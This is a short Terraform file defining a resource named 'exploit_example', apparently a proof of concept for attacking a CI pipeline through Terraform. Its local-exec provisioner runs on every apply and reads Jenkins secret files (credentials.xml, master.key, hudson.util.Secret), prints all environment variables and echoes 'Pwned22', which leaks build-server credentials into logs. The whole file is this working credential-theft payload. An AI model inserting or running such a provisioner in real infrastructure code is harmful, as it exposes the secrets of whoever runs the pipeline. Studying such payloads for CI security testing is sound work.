resource "null_resource" "exploit_example" {
  provisioner "local-exec" {
    command = <<EOT
    #!/bin/bash
    echo Pwned22
    cat $JENKINS_HOME/credentials.xml 
    cat $JENKINS_HOME/secrets/master.key
    cat $JENKINS_HOME/secrets/hudson.util.Secret 
    printenv
    date
    EOT
  }
  triggers = {
    always_run = "${timestamp()}"
  }
}

